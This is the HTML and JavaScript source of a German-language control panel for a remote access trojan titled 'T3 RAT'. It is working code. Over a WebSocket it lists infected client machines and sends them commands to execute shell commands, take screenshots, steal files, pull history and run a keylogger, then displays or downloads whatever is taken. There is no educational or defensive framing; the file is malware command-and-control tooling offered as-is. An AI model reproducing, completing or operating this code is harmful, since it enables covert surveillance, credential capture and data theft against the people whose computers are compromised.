<!DOCTYPE html>
<html lang="de">
  <head>
    <meta charset="UTF-8" />
    <title>T3 RAT Control Panel</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
          Helvetica, Arial, sans-serif;
        background-color: #121212;
        color: #e0e0e0;
        margin: 0;
        padding: 20px;
        display: flex;
        height: calc(100vh - 40px);
        gap: 20px;
      }
      .panel {
        background-color: #1e1e1e;
        border-radius: 8px;
        padding: 20px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      }
      #client-panel {
        width: 250px;
        display: flex;
        flex-direction: column;
      }
      #main-panel {
        flex-grow: 1;
        display: flex;
        flex-direction: column;
      }
      h2 {
        margin-top: 0;
        border-bottom: 1px solid #333;
        padding-bottom: 10px;
      }
      #client-list {
        list-style-type: none;
        padding: 0;
        flex-grow: 1;
      }
      #client-list li {
        padding: 10px;
        border-radius: 5px;
        cursor: pointer;
        margin-bottom: 5px;
        border: 1px solid transparent;
      }
      #client-list li:hover {
        background-color: #333;
      }
      #client-list li.selected {
        background-color: #0d47a1;
        border-color: #42a5f5;
        font-weight: bold;
      }
      #output {
        flex-grow: 1;
        background-color: #000;
        border: 1px solid #333;
        border-radius: 5px;
        padding: 10px;
        font-family: "Courier New", Courier, monospace;
        white-space: pre-wrap;
        word-wrap: break-word;
        overflow-y: auto;
        margin-bottom: 10px;
      }
      #controls {
        display: flex;
        gap: 10px;
      }
      input[type="text"] {
        flex-grow: 1;
        background-color: #333;
        border: 1px solid #555;
        color: #e0e0e0;
        padding: 10px;
        border-radius: 5px;
      }
      button {
        background-color: #0d47a1;
        color: white;
        border: none;
        padding: 10px 15px;
        border-radius: 5px;
        cursor: pointer;
      }
      button:hover {
        background-color: #1565c0;
      }
      .log-entry {
        padding: 2px 0;
      }
      .log-info {
        color: #4caf50;
      }
      .log-error {
        color: #f44336;
      }
      .log-cmd {
        color: #2196f3;
      }
    </style>
  </head>
  <body>
    <div id="client-panel" class="panel">
      <h2>Clients</h2>
      <ul id="client-list"></ul>
    </div>

    <div id="main-panel" class="panel">
      <div id="output"></div>
      <div id="controls">
        <input
          type="text"
          id="command-input"
          placeholder="Befehle: exec, screenshot, download, history, keylogger"
        />
        <button id="send-button">Senden</button>
      </div>
    </div>

    <script>
      const ws = new WebSocket(`ws://${window.location.host}/ws`);
      const clientList = document.getElementById("client-list");
      const output = document.getElementById("output");
      const commandInput = document.getElementById("command-input");
      const sendButton = document.getElementById("send-button");

      let selectedClientId = null;

      function log(message, type = "info") {
        const entry = document.createElement("div");
        entry.className = `log-entry log-${type}`;
        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        output.appendChild(entry);
        output.scrollTop = output.scrollHeight;
      }

      function createClientListItem(client) {
        const li = document.createElement("li");
        li.textContent = `ID: ${client.id} (${client.address[0]})`;
        li.dataset.clientId = client.id; // KORRIGIERT: camelCase
        if (client.id === selectedClientId) {
          li.classList.add("selected");
        }
        li.addEventListener("click", () => {
          selectedClientId = client.id;
          document
            .querySelectorAll("#client-list li")
            .forEach((el) => el.classList.remove("selected"));
          li.classList.add("selected");
          log(`Client ${selectedClientId} ausgewählt.`, "cmd");
        });
        return li;
      }

      function renderClientList(clients) {
        clientList.innerHTML = "";
        clients.forEach((client) => {
          const li = createClientListItem(client);
          clientList.appendChild(li);
        });
      }

      function sendCommand() {
        if (!selectedClientId) {
          log("Fehler: Kein Client ausgewählt.", "error");
          return;
        }
        const commandText = commandInput.value.trim();
        if (!commandText) return;

        const parts = commandText.split(" ");
        const action = parts[0].toLowerCase();
        const argument = parts.slice(1).join(" ");

        let payload = {
          target_id: selectedClientId,
          action: action,
        };

        switch (action) {
          case "exec":
            payload.command = argument;
            break;
          case "download":
            payload.path = argument;
            break;
          case "history":
            payload.limit = parseInt(argument) || 20;
            break;
          case "keylogger":
            payload.count = parseInt(argument) || 50;
            break;
          case "screenshot":
            break;
          default:
            log(
              "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger",
              "error"
            );
            return;
        }

        ws.send(JSON.stringify(payload));
        log(`Befehl gesendet: ${commandText}`, "cmd");
        commandInput.value = "";
      }

      function triggerDownload(filename, base64Data) {
        const link = document.createElement("a");
        link.href = `data:application/octet-stream;base64,${base64Data}`;
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }

      ws.onopen = () => log("Verbunden mit dem Control Server.");
      ws.onclose = () => log("Verbindung zum Control Server verloren.", "error");
      ws.onerror = (err) => log(`WebSocket Fehler: ${err}`, "error");

      ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        console.log("Empfangen:", data); // DEBUG

        switch (data.type) {
          case "client_list":
            renderClientList(data.clients);
            break;
          case "client_connected":
            log(`Neuer Client verbunden: ID ${data.client.id}`);
            const newClientLi = createClientListItem(data.client); // KORRIGIERT
            clientList.appendChild(newClientLi);
            break;
          case "client_disconnected":
            log(`Client ${data.client_id} hat die Verbindung getrennt.`, "error");
            const liToRemove = clientList.querySelector(
              `li[data-client-id='${data.client_id}']` // KORRIGIERT
            );
            if (liToRemove) liToRemove.remove();
            if (selectedClientId === data.client_id) selectedClientId = null;
            break;
          case "command_output":
            log(`[Client ${data.client_id}] Ausgabe:\n${data.output}`);
            break;
          case "screenshot":
            log(`[Client ${data.client_id}] Screenshot empfangen.`);
            const img = document.createElement("img");
            img.src = `data:image/png;base64,${data.data}`;
            img.style.maxWidth = "100%";
            img.style.marginTop = "10px";
            img.style.border = "1px solid #555";
            output.appendChild(img);
            output.scrollTop = output.scrollHeight;
            break;
          case "file_download":
            log(
              `[Client ${data.client_id}] Datei '${data.filename}' empfangen. Download wird gestartet.`
            );
            triggerDownload(data.filename, data.data);
            break;
          case "error":
            log(`[Server/Client Fehler] ${data.message || data.error}`, "error");
            break;
        }
      };

      sendButton.addEventListener("click", sendCommand);
      commandInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") sendCommand();
      });
    </script>
  </body>
</html>